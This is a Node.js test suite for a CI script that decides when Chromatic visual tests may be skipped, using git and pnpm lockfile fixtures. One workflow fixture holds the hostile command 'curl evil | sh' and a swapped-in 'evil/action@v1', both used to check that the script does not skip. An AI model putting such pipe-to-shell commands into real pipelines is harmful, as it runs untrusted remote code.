import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { mkdtemp, readFile, rm, writeFile } from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";
import test from "node:test";

import { parseAllDocuments } from "yaml";

import { commitFiles } from "../../test/support/git-fixture.js";

const script = fileURLToPath(new URL("../chromatic-scope.js", import.meta.url));
const repositoryRoot = path.dirname(
  fileURLToPath(new URL("../../package.json", import.meta.url)),
);

function git(cwd, ...args) {
  return execFileSync("git", args, { cwd, encoding: "utf8" }).trim();
}

async function repository(t) {
  const cwd = await mkdtemp(path.join(os.tmpdir(), "chromatic-scope-"));
  t.after(() => rm(cwd, { recursive: true, force: true }));
  git(cwd, "init", "-q");
  git(cwd, "config", "user.email", "test@example.com");
  git(cwd, "config", "user.name", "test");
  return cwd;
}

async function classify(cwd, args) {
  const outputFile = path.join(cwd, "github-output");
  await writeFile(outputFile, "");
  const stdout = execFileSync(process.execPath, [script, ...args], {
    cwd,
    encoding: "utf8",
    env: { ...process.env, GITHUB_OUTPUT: outputFile },
  });
  const written = await readFile(outputFile, "utf8");
  return {
    stdout,
    output: written.replace(/needs_stats=\w+\n/, ""),
    isStatsRequired: /needs_stats=true\n/.test(written),
  };
}

function compareArgs(base, head) {
  return ["--base", base, "--head", head];
}

function snapshot(name, version, dependencies = {}) {
  return `  ${JSON.stringify(`${name}@${version}`)}:\n${
    Object.keys(dependencies).length
      ? `    dependencies:\n${Object.entries(dependencies)
          .map(
            ([child, ref]) =>
              `      ${JSON.stringify(child)}: ${JSON.stringify(ref)}\n`,
          )
          .join("")}`
      : "    resolution: {integrity: sha512-example}\n"
  }`;
}

function lockfile({
  eslint = "9.0.0",
  color = "1.0.0",
  malformed = false,
  alias = false,
  pnpmIntegrity = "sha512-pnpm",
  pnpmVersion = "12.9.1",
} = {}) {
  const importers = `  .:\n    dependencies:\n      app-lib:\n        specifier: ^1.0.0\n        version: 1.0.0\n${
    alias
      ? "      alias-lib:\n        specifier: npm:real-lib@^1.0.0\n        version: real-lib@1.0.0\n"
      : ""
  }    devDependencies:\n      eslint:\n        specifier: ^9.0.0\n        version: ${eslint}\n    specifiers:\n      app-lib: ^1.0.0\n      eslint: ^9.0.0\n${
    alias ? "      alias-lib: npm:real-lib@^1.0.0\n" : ""
  }`;
  const packages = `  app-lib@1.0.0:\n    resolution: {integrity: sha512-app}\n  eslint@${eslint}:\n    resolution: {integrity: sha512-eslint-${eslint}}\n  color-lib@${color}:\n    resolution: {integrity: sha512-color-${color}}\n${
    alias ? "  real-lib@1.0.0:\n    resolution: {integrity: sha512-real}\n" : ""
  }`;
  const snapshots = `${snapshot("app-lib", "1.0.0", {
    "color-lib": malformed ? "8.0.0" : color,
  })}${snapshot("eslint", eslint)}${snapshot("color-lib", color)}${
    alias ? snapshot("real-lib", "1.0.0") : ""
  }`;
  const packageManager = `lockfileVersion: '9.0'\nimporters:\n  .:\n    packageManagerDependencies:\n      pnpm:\n        specifier: ${pnpmVersion}\n        version: ${pnpmVersion}\npackages:\n  pnpm@${pnpmVersion}:\n    resolution: {integrity: ${pnpmIntegrity}}\nsnapshots:\n  pnpm@${pnpmVersion}:\n    resolution: {integrity: ${pnpmIntegrity}}\n`;
  const resolution = `lockfileVersion: '9.0'\nsettings:\n  autoInstallPeers: true\noverrides: {}\nimporters:\n${importers}packages:\n${packages}snapshots:\n${snapshots}`;
  return `---\n${packageManager}---\n${resolution}`;
}

const manifest = (eslint = "^9.0.0", alias = false, extra = {}) =>
  JSON.stringify({
    name: "fixture",
    ...extra,
    dependencies: {
      "app-lib": "^1.0.0",
      ...(alias ? { "alias-lib": "npm:real-lib@^1.0.0" } : {}),
    },
    devDependencies: { eslint },
  });

async function commitPair(t, baseFiles, headFiles) {
  const cwd = await repository(t);
  const base = await commitFiles(cwd, baseFiles, "base");
  const head = await commitFiles(cwd, headFiles, "head");
  return { cwd, base, head };
}

async function lockPair(
  t,
  firstLock,
  secondLock,
  firstManifest,
  secondManifest,
) {
  return commitPair(
    t,
    { "package.json": firstManifest, "pnpm-lock.yaml": firstLock },
    {
      "package.json": secondManifest,
      "pnpm-lock.yaml": secondLock,
      "docs/marker.md": "changed\n",
    },
  );
}

test("compares from the merge-base, so base-only commits do not count as PR changes", async (t) => {
  const cwd = await repository(t);
  const fork = await commitFiles(cwd, { "docs/a.md": "a\n" }, "fork");
  const base = await commitFiles(cwd, { "src/Button.tsx": "next\n" }, "main");
  git(cwd, "checkout", "-q", "-b", "pr", fork);
  const head = await commitFiles(cwd, { "docs/a.md": "b\n" }, "pr");
  const result = await classify(cwd, compareArgs(base, head));
  assert.equal(result.output, "skip=true\n");
});

test("skips only when every changed path is non-visual", async (t) => {
  const skipped = {
    ".agents/skills/x/SKILL.md": "next\n",
    ".claude/launch.json": "{}\n",
    "AGENTS.md": "next\n",
    "GLOSSARY.md": "next\n",
    "README.zh-TW.md": "next\n",
    "docs/images/shot.png": "next\n",
    "blueprint/content/features/example.md": "next\n",
    ".github/workflows/ci.yml": "next\n",
    "scripts/verify.js": "next\n",
    "src/components/__tests__/Button.test.tsx": "next\n",
    "test/support/fixture.js": "next\n",
    "jest.config.ts": "next\n",
    ".nvmrc": "24.22.1\n",
    "components.json": "{}\n",
  };
  for (const [files, skip] of [
    [skipped, true],
    [{ ".github/workflows/chromatic.yml": "next\n" }, false],
    [{ "scripts/chromatic-scope.js": "next\n" }, false],
    [{ ...skipped, "src/Button.tsx": "next\n" }, false],
    [{ "src/Button.test.tsx": "next\n", "src/Button.tsx": "next\n" }, false],
    [{ ".storybook/preview.ts": "next\n" }, false],
    [{ "src/app.css": "next\n" }, false],
    [{ "tsconfig.json": "next\n" }, false],
  ]) {
    const { cwd, base, head } = await commitPair(
      t,
      { "docs/a.md": "a\n" },
      files,
    );
    const result = await classify(cwd, compareArgs(base, head));
    assert.equal(result.output, `skip=${skip}\n`, Object.keys(files).join());
  }
});

test("skips an allowlisted devDependency-only update, including a real npm alias graph", async (t) => {
  const { cwd, base, head } = await lockPair(
    t,
    lockfile({ alias: true }),
    lockfile({ eslint: "9.1.0", alias: true }),
    manifest("^9.0.0", true),
    manifest("^9.1.0", true),
  );
  const result = await classify(cwd, compareArgs(base, head));
  assert.match(result.stdout, /skip=true reason=/);
  assert.equal(result.output, "skip=true\n");
});

test("skips a husky specifier-only change against the repository's full current lockfile", async (t) => {
  const packageText = await readFile(
    path.join(repositoryRoot, "package.json"),
    "utf8",
  );
  const lockText = await readFile(
    path.join(repositoryRoot, "pnpm-lock.yaml"),
    "utf8",
  );
  const packageData = JSON.parse(packageText);
  const documents = parseAllDocuments(lockText);
  const importer = documents
    .at(-1)
    .getIn(["importers", ".", "devDependencies", "husky"]);
  const resolved = importer.get("version");
  const nextSpecifier =
    packageData.devDependencies.husky === resolved ? `^${resolved}` : resolved;
  importer.set("specifier", nextSpecifier);
  packageData.devDependencies.husky = nextSpecifier;
  const nextLock = documents.map((document) => document.toString()).join("");
  const { cwd, base, head } = await commitPair(
    t,
    { "package.json": packageText, "pnpm-lock.yaml": lockText },
    {
      "package.json": `${JSON.stringify(packageData, null, 2)}\n`,
      "pnpm-lock.yaml": nextLock,
      "docs/marker.md": "changed\n",
    },
  );
  const result = await classify(cwd, compareArgs(base, head));
  assert.match(result.stdout, /skip=true reason=/);
  assert.equal(result.output, "skip=true\n");
});

test("runs when native first-document package manager metadata changes", async (t) => {
  const { cwd, base, head } = await lockPair(
    t,
    lockfile(),
    lockfile({ pnpmIntegrity: "sha512-updated-pnpm" }),
    manifest(),
    manifest(),
  );
  const result = await classify(cwd, compareArgs(base, head));
  assert.match(result.stdout, /reason=pnpm lockfile environment changed/);
  assert.equal(result.output, "skip=false\n");
});

test("fails closed for malformed locks, dangling refs, unsupported versions, and extra documents", async (t) => {
  const invalidCases = [
    [lockfile(), "not: [valid"],
    [lockfile(), lockfile({ malformed: true })],
    [lockfile(), lockfile().replaceAll("'9.0'", "'8.0'")],
    [lockfile(), `${lockfile()}---\nunsupported: true\n`],
  ];
  for (const [firstLock, secondLock] of invalidCases) {
    const { cwd, base, head } = await lockPair(
      t,
      firstLock,
      secondLock,
      manifest(),
      manifest(),
    );
    const result = await classify(cwd, compareArgs(base, head));
    assert.match(result.stdout, /skip=false reason=/);
    assert.equal(result.output, "skip=false\n");
  }
});

test("fails closed for missing or malformed refs and --force writes skip=false", async (t) => {
  const { cwd, base, head } = await lockPair(
    t,
    lockfile(),
    lockfile({ eslint: "9.1.0" }),
    manifest(),
    manifest("^9.1.0"),
  );
  for (const args of [
    ["--head", head],
    ...[compareArgs("main", head), compareArgs(base, "f".repeat(40))],
  ]) {
    const result = await classify(cwd, args);
    assert.match(result.stdout, /skip=false reason=/);
    assert.equal(result.output, "skip=false\n");
  }
  const forced = await classify(cwd, ["--force"]);
  assert.match(forced.stdout, /skip=false reason=forced/);
  assert.equal(forced.output, "skip=false\n");
});

test("runs when a visual file is renamed or deleted", async (t) => {
  for (const change of ["rename", "delete"]) {
    const cwd = await repository(t);
    const base = await commitFiles(
      cwd,
      { "src/old.tsx": "component\n", "docs/a.md": "a\n" },
      "base",
    );
    // The new path is safe, so only the old path can make this run.
    if (change === "rename") git(cwd, "mv", "src/old.tsx", "docs/old.tsx");
    else git(cwd, "rm", "src/old.tsx");
    git(cwd, "add", "--all");
    git(cwd, "commit", "-qm", change);
    const head = git(cwd, "rev-parse", "HEAD");
    const result = await classify(cwd, compareArgs(base, head));
    assert.match(result.stdout, /skip=false reason=/, change);
    assert.equal(result.output, "skip=false\n", change);
  }
});

test("skips manifest metadata and package manager pin changes", async (t) => {
  for (const [firstLock, secondLock, base, head] of [
    [
      lockfile(),
      lockfile(),
      manifest("^9.0.0", false, { version: "1.0.0" }),
      manifest("^9.0.0", false, { version: "1.1.0" }),
    ],
    [
      lockfile(),
      lockfile(),
      manifest("^9.0.0", false, { scripts: { test: "a" } }),
      manifest("^9.0.0", false, { scripts: { test: "b" } }),
    ],
    [
      lockfile(),
      lockfile(),
      manifest("^9.0.0", false, { engines: { node: ">=22" } }),
      manifest("^9.0.0", false, { engines: { node: ">=24" } }),
    ],
    [
      lockfile(),
      lockfile({ pnpmVersion: "12.14.0", pnpmIntegrity: "sha512-pnpm-next" }),
      manifest("^9.0.0", false, { packageManager: "pnpm@12.9.1" }),
      manifest("^9.0.0", false, { packageManager: "pnpm@12.14.0" }),
    ],
  ]) {
    const pair = await lockPair(t, firstLock, secondLock, base, head);
    const result = await classify(pair.cwd, compareArgs(pair.base, pair.head));
    assert.equal(result.output, "skip=true\n", result.stdout);
  }
});

test("runs when dependencies or overrides change", async (t) => {
  for (const [base, head] of [
    [
      manifest(),
      JSON.stringify({
        ...JSON.parse(manifest()),
        dependencies: { "app-lib": "^2.0.0" },
      }),
    ],
    [
      manifest("^9.0.0", false, { overrides: { "color-lib": "1.0.0" } }),
      manifest("^9.0.0", false, { overrides: { "color-lib": "1.1.0" } }),
    ],
    [
      manifest("^9.0.0", false, { sideEffects: false }),
      manifest("^9.0.0", false, { sideEffects: true }),
    ],
    [
      manifest("^9.0.0", false, { futureField: 1 }),
      manifest("^9.0.0", false, { futureField: 2 }),
    ],
  ]) {
    const pair = await lockPair(
      t,
      lockfile(),
      lockfile({ color: "1.1.0" }),
      base,
      head,
    );
    const result = await classify(pair.cwd, compareArgs(pair.base, pair.head));
    assert.match(result.stdout, /skip=false reason=protected package manifest/);
    assert.equal(result.isStatsRequired, false);
  }
});

test("chromatic workflow skips only non-Chromatic action pin bumps", async (t) => {
  const workflow = ({
    checkout = "actions/checkout@v7",
    chromatic = "chromaui/action@latest",
    input = "a",
    isSwapped = false,
    hasExtraStep = false,
    script = "echo safe",
  } = {}) => {
    const steps = [
      `      - uses: ${checkout}\n`,
      `      - uses: ${chromatic}\n        with:\n          skip: ${input}\n`,
    ];
    if (isSwapped) steps.reverse();
    if (hasExtraStep) steps.push("      - uses: actions/cache@v4\n");
    steps.push(`      - run: |\n          uses: x@1 ${script}\n`);
    return `jobs:\n  chromatic:\n    steps:\n${steps.join("")}`;
  };
  const base = workflow();
  for (const [head, isSkipped] of [
    [workflow({ checkout: "actions/checkout@v8" }), true],
    [base.replace("v7\n", "v7 # pinned\n"), true],
    [workflow({ checkout: "actions/checkout@v8 # v8" }), true],
    [workflow({ chromatic: "chromaui/action@v2" }), false],
    [workflow({ chromatic: '"chromaui/action@v2"' }), false],
    [workflow({ chromatic: "ChromaUI/action@v2" }), false],
    [workflow({ checkout: "evil/action@v1" }), false],
    [workflow({ checkout: "Actions/Checkout@v7" }), false],
    [workflow({ input: "b" }), false],
    [workflow({ isSwapped: true }), false],
    [workflow({ hasExtraStep: true }), false],
    [workflow({ script: "curl evil | sh" }), false],
    ["jobs: [unclosed\n", false],
  ]) {
    const pair = await commitPair(
      t,
      { ".github/workflows/chromatic.yml": base },
      { ".github/workflows/chromatic.yml": head },
    );
    const result = await classify(pair.cwd, compareArgs(pair.base, pair.head));
    assert.equal(result.output, `skip=${isSkipped}\n`, head);
  }
  const removed = await commitPair(
    t,
    { ".github/workflows/chromatic.yml": workflow({ hasExtraStep: true }) },
    { ".github/workflows/chromatic.yml": base },
  );
  const result = await classify(
    removed.cwd,
    compareArgs(removed.base, removed.head),
  );
  assert.equal(result.output, "skip=false\n");
});

test("runs when package manager configDependencies change", async (t) => {
  const withConfig = (text, config) =>
    text.replace(
      "importers:\n  .:\n",
      `importers:\n  .:\n    configDependencies: ${config}\n`,
    );
  const pair = await lockPair(
    t,
    withConfig(lockfile(), "{}"),
    withConfig(lockfile(), "{foo: 1.0.0}"),
    manifest(),
    manifest(),
  );
  const result = await classify(pair.cwd, compareArgs(pair.base, pair.head));
  assert.equal(result.output, "skip=false\n", result.stdout);
});

test("runs for lockfile changes only the graph check can see", async (t) => {
  const devEslintAlsoRuntime = (specifier) =>
    lockfile().replace(
      "    devDependencies:\n      eslint:\n        specifier: ^9.0.0",
      `      eslint:\n        specifier: ^9.0.0\n        version: 9.0.0\n    devDependencies:\n      eslint:\n        specifier: ${specifier}`,
    );
  const withOptional = (grandchild) =>
    lockfile()
      .replace(
        "    devDependencies:\n",
        "    optionalDependencies:\n      opt-lib:\n        specifier: ^1.0.0\n        version: 1.0.0\n    devDependencies:\n",
      )
      .replace(
        "packages:\n  app-lib@1.0.0:",
        `packages:\n  opt-lib@1.0.0:\n    resolution: {integrity: sha512-opt}\n  opt-child@1.0.0:\n    resolution: {integrity: sha512-child}\n  opt-grandchild@${grandchild}:\n    resolution: {integrity: sha512-grandchild-${grandchild}}\n  app-lib@1.0.0:`,
      )
      .replace(
        'snapshots:\n  "app-lib',
        `snapshots:\n${snapshot("opt-lib", "1.0.0", { "opt-child": "1.0.0" }).replace("dependencies:", "optionalDependencies:")}${snapshot("opt-child", "1.0.0", { "opt-grandchild": grandchild })}${snapshot("opt-grandchild", grandchild)}  "app-lib`,
      );
  const linked = (eslint) =>
    lockfile({ eslint }).replace(
      "        version: 1.0.0\n",
      "        version: link:../lib\n",
    );
  const conflictingPin = lockfile().replace(
    "    devDependencies:\n",
    "    packageManagerDependencies:\n      pnpm:\n        specifier: 1.0.0\n        version: 1.0.0\n    devDependencies:\n",
  );
  for (const [name, firstLock, secondLock, reason, isStatsRequired] of [
    [
      "resolution settings",
      lockfile(),
      lockfile().replace("autoInstallPeers: true", "autoInstallPeers: false"),
      /lockfile environment changed/,
      false,
    ],
    [
      "dev tool also a runtime dependency",
      devEslintAlsoRuntime("^9.0.0"),
      devEslintAlsoRuntime("^9.0.1"),
      /dependency graph changed/,
      false,
    ],
    [
      "transitive optional dependency",
      withOptional("1.0.0"),
      withOptional("1.1.0"),
      /need Storybook stats: opt-child, opt-grandchild/,
      true,
    ],
    [
      "link: reference",
      linked("9.0.0"),
      linked("9.1.0"),
      /unsupported package reference/,
      false,
    ],
    [
      "importer documents disagree",
      lockfile(),
      conflictingPin,
      /importer documents differ/,
      false,
    ],
  ]) {
    const pair = await lockPair(
      t,
      firstLock,
      secondLock,
      manifest(),
      manifest(),
    );
    const result = await classify(pair.cwd, compareArgs(pair.base, pair.head));
    assert.match(result.stdout, reason, name);
    assert.equal(result.output, "skip=false\n", name);
    assert.equal(result.isStatsRequired, isStatsRequired, name);
  }
});

// A transitive package renamed so the toolchain patterns can be probed.
const transitiveAs = (name, color) =>
  lockfile({ color })
    .replace(`  color-lib@${color}:`, `  "${name}@${color}":`)
    .replaceAll("color-lib", name);

const statsWith = (modules) => JSON.stringify({ modules });
const bundledModule = (name) =>
  `./node_modules/.pnpm/${name.replace("/", "+")}@1.1.0/node_modules/${name}/index.js`;

async function transitivePair(t, firstLock, secondLock, stats) {
  const pair = await lockPair(t, firstLock, secondLock, manifest(), manifest());
  const file = path.join(pair.cwd, "preview-stats.json");
  if (stats !== undefined) await writeFile(file, stats);
  return { pair, args: ["--stats", file] };
}

// app-lib -> color-lib@appColor and app-lib -> extra-lib, where extra-lib
// optionally pins its own color-lib, so one name can carry two versions.
function extraLock(appColor = "1.0.0", extraColor) {
  const lock = lockfile({ color: appColor })
    .replace(
      `      "color-lib": "${appColor}"\n`,
      `      "color-lib": "${appColor}"\n      "extra-lib": "1.0.0"\n`,
    )
    .replace(
      "packages:\n  app-lib@1.0.0:",
      "packages:\n  extra-lib@1.0.0:\n    resolution: {integrity: sha512-extra}\n  app-lib@1.0.0:",
    )
    .replace(
      'snapshots:\n  "app-lib',
      `snapshots:\n${snapshot("extra-lib", "1.0.0", extraColor ? { "color-lib": extraColor } : {})}  "app-lib`,
    );
  if (!extraColor || extraColor === appColor) return lock;
  return lock
    .replace(
      "packages:\n  extra-lib@1.0.0:",
      `packages:\n  color-lib@${extraColor}:\n    resolution: {integrity: sha512-color-${extraColor}}\n  extra-lib@1.0.0:`,
    )
    .replace(
      'snapshots:\n  "extra-lib',
      `snapshots:\n${snapshot("color-lib", extraColor)}  "extra-lib`,
    );
}

test("asks for Storybook stats only when transitive packages alone change version", async (t) => {
  const withExtra = extraLock();
  const colorFromExtra = (version) => extraLock("1.0.0", version);
  const runtimeEslint = (version) =>
    lockfile({ eslint: version }).replace(
      "    devDependencies:\n      eslint:\n        specifier: ^9.0.0",
      `      eslint:\n        specifier: ^9.0.0\n        version: ${version}\n    devDependencies:\n      eslint:\n        specifier: ^9.0.0`,
    );
  for (const [name, secondLock, reason, isStatsRequired, firstLock] of [
    [
      "transitive version",
      lockfile({ color: "1.1.0" }),
      /need Storybook stats: app-lib, color-lib/,
      true,
    ],
    [
      "added transitive package",
      withExtra,
      /protected dependency graph changed/,
      false,
    ],
    [
      "direct dependency version",
      runtimeEslint("9.1.0"),
      /protected dependency graph changed/,
      false,
      runtimeEslint("9.0.0"),
    ],
    [
      "second version of a transitive package",
      colorFromExtra("2.0.0"),
      /need Storybook stats: color-lib, extra-lib/,
      true,
      colorFromExtra("1.0.0"),
    ],
    [
      "renamed transitive package",
      transitiveAs("hue-lib", "1.0.0"),
      /protected dependency graph changed/,
      false,
    ],
  ]) {
    const { pair } = await transitivePair(
      t,
      firstLock ?? lockfile(),
      secondLock,
    );
    const result = await classify(pair.cwd, compareArgs(pair.base, pair.head));
    assert.match(result.stdout, reason, name);
    assert.equal(result.output, "skip=false\n", name);
    assert.equal(result.isStatsRequired, isStatsRequired, name);
  }
});

test("skips transitive changes only when they stay out of the Storybook build", async (t) => {
  const unrelated = { name: bundledModule("other-lib") };
  for (const [name, stats, skip, reason] of [
    [
      "outside the build",
      statsWith([unrelated]),
      true,
      /stay out of the Storybook build: app-lib, color-lib/,
    ],
    [
      "top-level module",
      statsWith([{ name: bundledModule("color-lib") }]),
      false,
      /reach the Storybook build: color-lib/,
    ],
    [
      "concatenated module",
      statsWith([
        {
          name: "./src/a.ts + 1 modules",
          modules: [{ name: bundledModule("color-lib") }],
        },
      ]),
      false,
      /reach the Storybook build: color-lib/,
    ],
    [
      "loader identifier",
      statsWith([
        {
          name: "./src/a.css",
          identifier: `${bundledModule("color-lib")}!./src/a.css`,
        },
      ]),
      false,
      /reach the Storybook build: color-lib/,
    ],
    [
      "module type identifier",
      statsWith([
        {
          name: "./src/a.ts",
          identifier: `javascript/auto|/repo/${bundledModule("color-lib").slice(2)}|layer`,
        },
      ]),
      false,
      /reach the Storybook build: color-lib/,
    ],
    ["missing stats", undefined, false, /unable to classify safely/],
    ["corrupt stats", "{not json", false, /unable to classify safely/],
    [
      "modules not a list",
      JSON.stringify({ modules: {} }),
      false,
      /unable to classify safely: stats modules is not a list/,
    ],
    [
      "modules nest too deep",
      statsWith([
        [1, 2, 3, 4, 5, 6, 7, 8, 9].reduce(
          (inner) => ({ name: "./a.ts", modules: [inner] }),
          unrelated,
        ),
      ]),
      false,
      /unable to classify safely: stats modules nest too deep/,
    ],
  ]) {
    const { pair, args } = await transitivePair(
      t,
      lockfile(),
      lockfile({ color: "1.1.0" }),
      stats,
    );
    const result = await classify(pair.cwd, [
      ...compareArgs(pair.base, pair.head),
      ...args,
    ]);
    assert.match(result.stdout, reason, name);
    assert.equal(result.output, `skip=${skip}\n`, name);
    assert.equal(result.isStatsRequired, false, name);
  }
});

test("runs when one of two versions of a bundled package changes", async (t) => {
  const { pair, args } = await transitivePair(
    t,
    extraLock("1.0.0", "2.0.0"),
    extraLock("1.1.0", "2.0.0"),
    statsWith([{ name: bundledModule("color-lib") }]),
  );
  const result = await classify(pair.cwd, [
    ...compareArgs(pair.base, pair.head),
    ...args,
  ]);
  assert.match(result.stdout, /reach the Storybook build: color-lib/);
  assert.equal(result.output, "skip=false\n");
});

test("runs when a changed transitive package is bundled under a scope or is build tooling", async (t) => {
  const stats = statsWith([{ name: bundledModule("@acme/ui") }]);
  for (const [name, skip] of [
    ["@acme/ui", false],
    ["postcss-value-parser", false],
    ["@swc/helpers", false],
    ["caniuse-lite", false],
    ["postcssify", true],
    ["@swcx/helpers", true],
  ]) {
    const { pair, args } = await transitivePair(
      t,
      transitiveAs(name, "1.0.0"),
      transitiveAs(name, "1.1.0"),
      stats,
    );
    const result = await classify(pair.cwd, [
      ...compareArgs(pair.base, pair.head),
      ...args,
    ]);
    assert.equal(result.output, `skip=${skip}\n`, `${name}: ${result.stdout}`);
  }
});

test("names a package by its locator, not its peer suffix or tarball reference", async (t) => {
  const withReference = (reference) =>
    lockfile()
      .replace(
        '      "color-lib": "1.0.0"\n',
        `      "color-lib": "${reference}"\n`,
      )
      .replace('  "color-lib@1.0.0":', `  "color-lib@${reference}":`)
      .replace(
        "  color-lib@1.0.0:",
        `  "color-lib@${reference.split("(")[0]}":`,
      );
  for (const [first, second] of [
    ["1.0.0(peer-lib@1.0.0)", "1.0.0(peer-lib@2.0.0)"],
    [
      "https://pkg.test/u@1/color-lib.tgz",
      "https://pkg.test/u@2/color-lib.tgz",
    ],
  ]) {
    const { pair, args } = await transitivePair(
      t,
      withReference(first),
      withReference(second),
      statsWith([{ name: bundledModule("other-lib") }]),
    );
    const result = await classify(pair.cwd, [
      ...compareArgs(pair.base, pair.head),
      ...args,
    ]);
    assert.match(
      result.stdout,
      /stay out of the Storybook build: app-lib, color-lib$/m,
      second,
    );
    assert.equal(result.output, "skip=true\n", second);
  }
});

test("runs for an unknown argument", async (t) => {
  const cwd = await repository(t);
  const result = await classify(cwd, ["--bogus"]);
  assert.match(result.stdout, /skip=false reason=unknown argument/);
  assert.equal(result.output, "skip=false\n");
});
